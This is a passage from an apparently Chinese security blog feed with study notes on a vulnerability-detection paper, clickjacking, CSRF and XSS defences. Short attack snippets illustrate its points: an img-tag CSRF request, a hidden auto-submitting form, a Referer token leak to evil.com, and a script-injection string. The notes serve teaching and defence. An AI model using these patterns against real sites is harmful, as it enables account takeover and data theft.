network，EA-GCN）模块：为了利用简化图中的不同边类型（如抽象语法树AST和控制流图CFG）来增强节点表示，作者提出了EA-GCN。</p><p>首先对代码结构图中所有节点的嵌入向量进行初始化。将节点中的代码标记为token序列，基于word2vec初始化每个token的嵌入，计算节点中所有token嵌入的平均值，作为整个节点的初始嵌入。</p><p>然后在消息传递过程中，分别对不同类型的边加权计算节点向量。进一步引入多头注意力机制整合图中的异构边信息，计算并聚合节点边的注意力分数，以增强节点表示。 最终可以计算得到整个图的<strong>边增强节点表示矩阵</strong>。</p></li><li><p><strong>核尺度表示模块</strong>：核尺度表示模块旨在通过显式捕捉远距离节点之间的关系来学习图的全局信息。</p><p>该模块设计了双尺度卷积核，其中大卷积核关注于远距离节点之间的关系，小卷积核关注于邻居节点之间的关系，两个卷积核并行进行卷积操作。两个分支的卷积结果经过批归一化（BN）层处理后相加，将最终的结果通过两个全连接层和一个softmax函数进行二分类，判断源代码中是否存在漏洞。</p></li></ul><h2 id="2-3、实验设置"><a href="#2-3、实验设置" class="headerlink" title="2.3、实验设置"></a>2.3、实验设置</h2><p>使用了三个广泛研究的开源C&#x2F;C++项目基准数据集</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611152606586.png" alt="image-20240611152606586"></p><p>作者将AMPLE与三种基于图和三种基于令牌的SOTA漏洞检测方法分别在选用的所有数据集上进行了比较，可以看到AMPLE基本是全面优于基线模型的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611152752272.png" alt="image-20240611152752272"></p><h1 id="3、个人思考"><a href="#3、个人思考" class="headerlink" title="3、个人思考"></a>3、个人思考</h1><ul><li>AMPLE围绕基于GNN进行漏洞检测的两大问题展开：1）难以处理代码结构图中长距离节点之间的连接依赖。2）不能很好地利用代码结构图中的多种边类型。作者分别设计了核尺度表示模块和边感知图卷积网络模块来解决这两大问题，模型整体在F1方面相比SOTA模型有显著的提高，论文思路条理十分清晰。</li><li>尽管图简化方法减少了节点数量，但增强图表示学习模块（EA-GCN和核尺度表示模块）的<strong>计算复杂度</strong>仍然较高，特别是在处理大型代码库时，可能面临计算资源和时间的挑战。</li><li>虽然在基准数据集上表现优异，但这些基准数据集均为C&#x2F;C++数据集，<strong>在其他类型编程语言上的泛化能力</strong>仍需进一步验证和优化。</li><li>论文中的方法通过二分类来判断代码片段是否存在漏洞，检测粒度在函数级别和模块&#x2F;类级别，<strong>不能实现漏洞的精确定位</strong>。在实际应用中，还需要结合其他技术手段来实现漏洞的精确定位和修复。未来工作可以考虑如何将此方法与精确定位技术结合，提供更全面的漏洞检测和修复方案。</li></ul><h1 id="论文团队信息"><a href="#论文团队信息" class="headerlink" title="论文团队信息"></a>论文团队信息</h1><p>通讯作者高翠芸，哈尔滨工业大学（深圳）计算机学院终身副教授、博导，学校青年拔尖人才，香港中文大学（CUHK）博士，深圳市“海外高层次人才”，鹏城实验室双聘学者，获得第九届中国科协青年人才托举工程项目。</p><ul><li>主要研究方向：人工智能+软件工程，大语言模型；漏洞检测</li><li>70+篇论文发表在程序分析和软件工程领域的顶级会议和期刊上，如TSE、TOSEM、ICSE、 ISSTA、ASE等。</li><li>个人主页：<a href="https://cuiyungao.github.io/">https://cuiyungao.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 论文笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源代码漏洞检测 </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『点击劫持』ClickJacking</title>
      <link href="/posts/547c.html"/>
      <url>/posts/547c.html</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>点击劫持是一种视觉上的欺骗手段。</p><p>黑客使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，<br>此时用户将在不知情的情况下点击透明的iframe页面。</p><p>通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上，从而使用户完成不知情的操作。</p><h1 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h1><h2 id="图片覆盖攻击"><a href="#图片覆盖攻击" class="headerlink" title="图片覆盖攻击"></a>图片覆盖攻击</h2><p>图片覆盖攻击，Cross Site Image Overlaying攻击，简称XSIO。</p><p>例如，以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://disenchant.ch&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://disenchant.ch/powered.jpg</span></span></span><br><span class="line"><span class="tag"><span class="attr">style</span>=<span class="string">position:absolute;right:320px;top:90px;/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过调整图片的style使得图片能够覆盖在黑客所指定的任意网页位置。</p><p>如果用户打算点击网页的的logo，而此logo已经被黑客的图片所覆盖，那么点击后就会链接到<code>http: //disenchant. ch</code>。如果 <code>http: //disenchant. ch</code> 是钓鱼网站，那用户很可能会上当。</p><h2 id="拖拽劫持与数据窃取"><a href="#拖拽劫持与数据窃取" class="headerlink" title="拖拽劫持与数据窃取"></a>拖拽劫持与数据窃取</h2><ol><li><p><strong>背景</strong></p><p>很多浏览器都开始支持Drag &amp; Drop 的API。对于用户来说，拖拽使他们的操作更加简单。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此<strong>拖拽是不受同源策略限制的</strong>。</p></li><li><p><strong>攻击思路</strong></p><p>拖拽劫持的思路是诱使用户从隐藏的不可见iframe中“拖拽”出黑客希望得到的数据，<br>然后放到黑客能控制的另外一个页面中，从而窃取数据。</p><blockquote><p>所以拖拽部分为iframe中黑客想要的数据，即正常的页面。</p><p>放置部分为黑客控制页面，黑客可以从这里获取这部分数据</p></blockquote></li><li><p><strong>例子</strong></p><p>黑客制作了一个网页小游戏，将球拖拽到小海豹的头顶上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607173659420.png" alt="image-20240607173659420"></p><p>小球和小海豹的头顶都有隐藏的iframe。</p><p>黑客利用event.dataTransfer.getData(‘Text’)来获取“drag”到的数据。当用户拖拽小球时，实际上是选中了隐藏的iframe里的数据；在放下小球时，把数据也放在了隐藏的textarea中，从而完成一次数据窃取的过程。</p></li></ol><h2 id="触屏劫持"><a href="#触屏劫持" class="headerlink" title="触屏劫持"></a>触屏劫持</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607174131863.png" alt="image-20240607174131863"></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607174143674.png" alt="image-20240607174143674"></p><h1 id="点击劫持防御"><a href="#点击劫持防御" class="headerlink" title="点击劫持防御"></a>点击劫持防御</h1><p>一般是通过禁止跨域的iframe来防范</p><h2 id="frame-busting"><a href="#frame-busting" class="headerlink" title="frame busting"></a>frame busting</h2><p>通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( top.<span class="property">location</span> != location ) &#123;</span><br><span class="line">    top.<span class="property">location</span> = self.<span class="property">location</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于frame busting是用JS写的，控制能力并不是特别强，因此有许多方法可以绕过它。</p><p>例，对parent.location的frame busting，就可以采用嵌套多个iframe的方法绕过。</p><h2 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h2><p>因为frame busting存在被绕过的可能，一般使用HTTP头——X-Frame-Options来进行防御。</p><p>它有三个可选的值：</p><ul><li>DENY：浏览器会拒绝当前页面加载任何frame页面；</li><li>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</li><li>ALLOW-FROM origin：允许frame加载的页面地址；</li></ul><p>一些浏览器拓展，如Firefox的NoScript扩展也可以防御。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> 点击劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站点请求伪造』CSRF攻击</title>
      <link href="/posts/3f8b.html"/>
      <url>/posts/3f8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a href="#定义与原理" class="headerlink" title="定义与原理"></a>定义与原理</h1><ul><li><p><strong>定义</strong></p><p>CSRF（Cross Site Request Forgery，跨站点请求伪造）</p><p><strong>通过伪装成受信任用户请求受信任的网站</strong>。对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等</p></li><li><p><strong>例子</strong></p><p>假设请求这个url可以删除掉编号为156713012的搜狐博客文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/mange/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>假设这个url同时还存在csrf漏洞，我们可以尝试利用这个漏洞，删除掉这篇文章。</p><p>攻击者可以首先在自己的域构造一个页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/csrf.html</span><br></pre></td></tr></table></figure><p>其中包含一个img标签，指向上面的删除博客文章的链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot; /&gt;</span><br></pre></td></tr></table></figure><p>攻击者可以诱使博主访问自己构造的页面 <code>http://www.a.com/csrf.html</code>，博主看到的是一个无法显示的图片，此时博客文章已经被删除掉了。</p><p>原因就是：博主在访问该页面的时候，图片标签向搜狐服务器发送了一次GET请求，删除了文章。</p></li></ul><h1 id="CSRF进阶"><a href="#CSRF进阶" class="headerlink" title="CSRF进阶"></a>CSRF进阶</h1><h2 id="浏览器的Cookie策略"><a href="#浏览器的Cookie策略" class="headerlink" title="浏览器的Cookie策略"></a>浏览器的Cookie策略</h2><p>一般csrf攻击的目标需要使用cookie</p><ol><li><p><strong>浏览器所持有的Cookie分为两种</strong></p><ul><li><p><strong>Session Cookie（临时Cookie）</strong></p><ul><li>没有指定Expire时间，保存在内存中，所以浏览器关闭后，Session Cookie就失效了。</li><li>浏览网站，若是一个网站设置了Session Cookie，那么在浏览器进程的生命周期内，即使浏览器新打开了Tab页，因为新Tab页在同一个浏览器进程中，Session Cookie也都是有效的，因此<strong>Session Cookie将被发送</strong>。</li></ul></li><li><p><strong>Third-party Cookie（本地Cookie）</strong></p><ul><li>服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地</li><li>如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，<strong>某些浏览器会阻止Third-party Cookie的发送</strong>。</li></ul><blockquote><p>例如，攻击者可以在自己的域上（b.com&#x2F;csrf.html）构造 <code>iframe</code>、<code>&lt;img&gt;</code>、<code>&lt;script&gt;</code> 、<code>&lt;link&gt;</code>等标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://www.a.com&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>抓包可以发现，发送出了 <code>Session Cookie</code></p></blockquote></li></ul></li><li><p><strong>每个浏览器的拦截策略不同</strong></p><ul><li><p>火狐默认允许发送本地Cookie：用户访问b.com，利用本地直接发送即可成功</p></li><li><p><a id="t1">IE浏览器不允许发送本地Cookie</a>：需要诱使用户在当前浏览器中先访问<code>http://www.a.com</code>，让Session cookie有效，然后再实施CSRF攻击。</p></li></ul></li></ol><h2 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h2><p>有些CSRF攻击并不需要进行认证，不需要发送cookie</p><ol><li><p><strong>P3P头的定义</strong></p><p>P3P Header（The Platform for Privacy Preferences）是W3C制定的一项关于隐私的标准。</p></li><li><p><strong>P3P头的作用</strong></p><ul><li><p>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。这种情况下即使是IE的<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>等标签也将不再拦截第三方Cookie的发送。</p></li><li><p>在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面。但是P3P头设置后，对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，不符合“最小权限”原则。</p></li><li><p>P3P头只需要由网站设置一次即可，滞后每次请求都会遵循此策略，不需要重复设置。</p></li></ul></li><li><p><strong>例子</strong></p><p><code>http://www.b.com/test.html</code> 代码如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe width=300 height=300 src=&quot;http;//www.a.com/test.php&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>在 <code>http://b.com</code> 中请求 <code>test.html</code>，它的 <code>iframe</code> 会告诉浏览器去跨域请求<code>http://http://www.a.com/test.php</code> 。</p><p><code>http://http://www.a.com/test.php</code> 的代码如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header&#123;&quot;Set-Cookie:test=axis;domain=.a.com;path=/&quot;&#125;; //临时cookie</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>而由于浏览器的同源策略，这里的set-cookie是不会成功的（无论是临时还是本地cookie都不会成功）</p><blockquote><p>注意这里和<a href="#t1">上面的例子</a>的区别：</p><p><strong>同源策略主要限制跨域请求时设置和读取Cookie</strong></p><p>上面的例子是用户主动访问<code>http://www.a.com</code>，这个请求是同源的，因为请求的源（浏览器中当前访问的页面）和目标源（<code>http://www.a.com</code>）是相同的。由于是同源请求，服务器可以成功地设置Session Cookie。浏览器会接受并存储这个Cookie。</p><p>当用户再访问攻击页面（<code>http://www.b.com/csrf.html</code>），这个页面包含一个指向<code>http://www.a.com</code>的<code>&lt;iframe&gt;</code>或其他请求。虽然这个请求是跨域的，但因为Session Cookie已经存在于浏览器中，所以浏览器会自动附带这个Session Cookie发送请求。</p><p>而<strong>这里的例子是跨域请求直接尝试设置Cookie</strong>，所以浏览器会拒绝这个操作，这是同源策略的限制。</p></blockquote><p>但是，在加入P3P头的情况下：P3P头允许跨域访问隐私数据，从而可以跨域set-cookie成功。</p><ul><li><p>正因为P3P头目前在网站的应用中被广泛应用，因此在CSRF的防御中不能依赖于浏览器对第三方Cookie的拦截策略，不能心存侥幸。</p></li><li><p>很多时候，如果测试CSRF时发现<code>&lt;iframe&gt;</code>等标签在IE中居然能发送Cookie，而又找不到原因，那么很可能就是因为P3P头在作怪。</p></li></ul></li></ol><h2 id="GET和POST"><a href="#GET和POST" class="headerlink" title="GET和POST"></a>GET和POST</h2><p>大多数CSRF攻击发起时，使用的HTML标签都是<code>&lt;img&gt;</code> 、<code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。</p><p>但是，这并不表示只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。</p><ul><li><p><strong>情景1：服务器没有区分get和post请求</strong></p><ul><li><p>对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是<code>$_REQUEST</code>，而非<code>$_POST</code>变量，则会存在这个问题。</p></li><li><p>例子：</p><p>以下表单</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/register&quot; id=&quot;register&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>用户可以尝试构造一个GET请求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/register?username=test&amp;password=passwd</span><br></pre></td></tr></table></figure><p><u>如果服务器没有区分get和post请求，那么这个请求会通过。</u></p></li></ul></li><li><p><strong>情景2：服务器区分get和post请求，可以在攻击代码中构造Post</strong></p><ul><li><p>服务器区分get和post请求的情况下，仍然可以在一个页面中构造好一个form表单，然后使用JavaScript自动提交这个表单。</p></li><li><p>例子：</p><p><code>http://www.b.com/test.html</code> 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot; &gt;</span><br><span class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var f = document.getElementById(&quot;register&quot;);</span><br><span class="line">f.inputs[0].value = &quot;test&quot;;</span><br><span class="line">f.inputs[1].value = &quot;passwd&quot;;</span><br><span class="line">f.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以<strong>将这个页面隐藏在一个不可见的iframe窗口中</strong>，那么整个自动提交表单的过程，对于用户来说也是不可见的。可以成功实现攻击（前提是获取到了cookie）</p></li></ul></li></ul><h2 id="CSRF-worm"><a href="#CSRF-worm" class="headerlink" title="CSRF worm"></a>CSRF worm</h2><p>2008年9月，国内的安全组织80sec公布了一个百度的CSRF Worm。 漏洞出现在百度用户中心的发送短消息功能中：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=用户账户&amp;co=消息内容</span><br></pre></td></tr></table></figure><p>只需要修改参数sn，即可对指定的用户发送短消息。</p><p>百度的另外一个接口则能查询出某个用户的所有好友：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://frd.baidu.com/?ct=28&amp;un=用户账户&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback=gotfriends</span><br></pre></td></tr></table></figure><p>将两者结合起来，可以组成一个CSRF Worm——让一个百度用户查看恶意页面后，将给他的所有好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次将消息发给他们的好友，这个Worm因此得以传播。</p><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><ol><li><p><strong>概念</strong></p><p>验证码被认为是对抗CSRF攻击<strong>最简洁而有效的防御方法</strong>。 </p><p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。</p></li><li><p><strong>缺点</strong></p><ul><li>但是很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。</li></ul><p>因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p></li></ol><h2 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h2><ol><li><p><strong>概念</strong></p><p>常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律。</p><p>例，一个“论坛发帖”的操作，在正常情况下需要先登录到用户后台，或者访问有发帖功能的页面。在提交“发帖”的表单时，Referer的值必然是发帖表单所在的页面。如果Referer的值不是这个页面，甚至不是发帖网站的域，则极有可能是CSRF攻击。</p></li><li><p><strong>缺点</strong></p><ul><li>服务器并非什么时候都能取到Referer。</li><li>很多用户出于隐私保护的考虑，限制了Referer的发送。</li><li>在某些情况下，浏览器也不会发送Referer。例如：从HTTPS跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。</li></ul><p>无法依赖于Referer Check作为防御CSRF的主要手段，可以通过Referer Check来监控CSRF攻击的发生。</p></li></ol><h2 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h2><p>目前<strong>业界针对CSRF的防御</strong>，一致的做法是使用Token</p><ol><li><p><strong>为什么使用Token</strong></p><p>CSRF能够攻击成功，其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。</p><p>出于这个原因，可以想到一个解决方案：<strong>把参数加密，或者使用一些随机数</strong>，从而让攻击者无法猜测到参数值，这就是token</p></li><li><p><strong>具体方法</strong></p><p>URL中，保持原参数不变，新增一个参数Token，值随机且不可预测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)]</span><br></pre></td></tr></table></figure><p>Token需要足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器，且为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token可以放在用户的Session中，或者浏览器的Cookie中。</p><p>由于Token的存在，黑客无法再构造出一个完整的URL实施CSRF攻击。</p><p>在提交请求时，服务器只需验证表单中的Token，与用户Session（或Cookie）中的Token是否一致，如果一致，则认为是合法请求；如果不一致，或者有一个为空，则认为请求不合法，可能发生了CSRF攻击。</p></li><li><p><strong>Token的使用原则</strong></p><ul><li><p>Token的生成一定要足够随机</p></li><li><p>设置一个用户的有效生命周期，在Token消耗掉前都使用同一个Token。</p><blockquote><p>如果用户已经提交了表单，则这个Token已经消耗掉，应该再次重新生成一个新的Token。</p><p>如果Token保存在Cookie中，而不是服务器端的Session中，一个用户打开几个相同的页面同时操作，当某个页面消耗掉Token后，其他页面的表单内保存的还是被消耗掉的那个Token，因此其他页面的表单再次提交时，会出现Token错误。在这种情况下，可以考虑<strong>生成多个有效的Token，以解决多页面共存的场景</strong>。</p></blockquote></li><li><p>保密性</p><ul><li><p><strong>Token如果出现在某个页面的URL中，则可能会通过Referer的方式泄露。</strong></p><p>在使用Token时，应该尽量把Token放在表单中。把敏感操作由GET改为POST，以form表单（或者AJAX）的形式提交。</p><p>例子：</p><p>以下是一个页面中删除操作的URL</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/path/manage?username=abc&amp;token=[random] </span><br></pre></td></tr></table></figure><p>如果这个页面包含了一张攻击者能指定地址的图片：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://evil.com/notexist&quot; /&gt;</span><br></pre></td></tr></table></figure><p>那么，当浏览器尝试加载这张图片时，会向 <code>http://evil.com</code> 服务器发送一个请求。在这个请求的HTTP头中，会包含Referer字段，其值为上面代表删除操作的URL。</p><p>攻击者通过查看Referer字段的内容，即可获取到包含敏感Token的URL，从而导致Token泄露。</p><blockquote><p>url中不是已经泄露了token嘛，为什么还要靠referer字段来获取token?</p><p>因为url中的token只有用户自己能看到，而后面的图片加载将url写入referer，让攻击者可以接收到对应操作中的token </p></blockquote></li><li><p>还有其他的可能导致token泄露的方法，如XSS、跨域漏洞等</p><blockquote><p>CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作。 </p><p>在XSS攻击下，攻击者完全可以请求页面后，读出页面内容里的Token值，然后再构造出一个合法的请求。 这个过程可以称之为XSRF，和CSRF以示区分。</p></blockquote></li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> CSRF攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』CSRF攻击</title>
      <link href="/posts/ceb6.html"/>
      <url>/posts/ceb6.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍如何对XSS攻击进行防御</p><h1 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h1><ol><li><p>定义：浏览器禁止页面的JS访问带有HttpOnly属性的Cookie。</p><blockquote><p>HttpOnly并非防止出现XSS，而是防御XSS后的Cookie劫持攻击。</p></blockquote></li><li><p>作用方式</p><p>在服务器对浏览器的请求进行回复，Set-Cookie时对cookie进行标记，服务器可能会设置多个Cookie，而HttpOnly可以有选择性地加在任何一个Cookie值上，因此可以仅将其加在用于认证的关键cookie上面。</p></li></ol><h1 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h1><ol><li><p>定义：</p><p>目前Web开发的普遍做法，是同时在<strong>客户端JavaScript</strong>中和<strong>服务器端代码</strong>中实现相同的输入检查。</p><blockquote><p>原因：</p><ul><li><strong>客户端检查提高用户体验</strong>：在客户端进行输入验证可以即时反馈错误信息给用户，无需等待服务器响应。节约了服务器资源的同时，也可以快速指导用户纠正错误，提高整体的用户体验。</li><li><strong>服务端检查保障安全性</strong>：尽管客户端验证可以提供即时反馈，但它<strong>可以被绕过</strong>。用户可以修改客户端代码，或者直接通过HTTP请求工具发送请求绕开客户端。因此，<strong>服务端验证是必不可少</strong>的，它保证了即使客户端验证被绕过，服务端仍然能够保护应用免受恶意数据的影响。</li></ul></blockquote></li><li><p>作用方式：存在比较多的开源xssfilter</p></li><li><p>局限性</p><p>1）<strong>语境</strong></p><p>XSS Filter在用户提交数据时获取变量，并进行XSS检查；但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。</p><blockquote><p>例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;$var&quot; &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中<code>$var</code>是用户可以控制的变量。用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。</p><p>如果是一个全局性的XSS Filter，则无法看到用户数据的输出语境，而只能看到用户提交了一个URL，很可能会漏报。因为在大多数情况下，URL是一种合法的用户数据。</p></blockquote><p>2）<strong>字符处理</strong></p><p>如果仅仅是对 <code>&lt;</code>、<code>&quot;</code> 等字符进行粗暴的转义或替换处理，可能会改变用户数据的语义。</p></li></ol><h1 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h1><h2 id="安全的编码函数"><a href="#安全的编码函数" class="headerlink" title="安全的编码函数"></a>安全的编码函数</h2><ol><li><p><strong>可以使用编码函数对输出中的敏感符号进行转义</strong></p><p>例如：JavascriptEncode对除数字、字母以外的所有字符，使用十六进制的方式进行编码。</p><p>还有很多的编码函数，如XMLEncode、JSONEncode等。</p></li><li><p><strong>在转义的时候要关注上下文环境</strong></p><p>不同的上下文环境（HTML文档结构和JavaScript程序逻辑）对数据的解析方式不同。如果在不适当的上下文中使用错误的转义方法，可能不会产生预期的防护效果，仍然允许XSS攻击的发生。所以要<strong>在正确的地方使用正确的编码方式</strong>。</p><p>例如：</p><p>a. <strong>初始HTML代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;body&gt;</span><br><span class="line">&lt;a href=# onclick=&quot;alert(&#x27;$var&#x27;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>这里的意图是在用户点击链接时弹出变量<code>$var</code>的内容。</p><p>b. <strong>用户输入和攻击向量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">Copy code</span><br><span class="line">$var = htmlencode(&quot;&#x27;);alert(&#x27;2&quot;);</span><br></pre></td></tr></table></figure><p>用户通过输入特制的字符串试图结束原有的<code>alert</code>函数调用，并开始一个新的<code>alert</code>函数，实际上注入了额外的JavaScript代码。</p><p>c. <strong>HTML编码应用后的结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;body&gt;</span><br><span class="line">&lt;a href=# 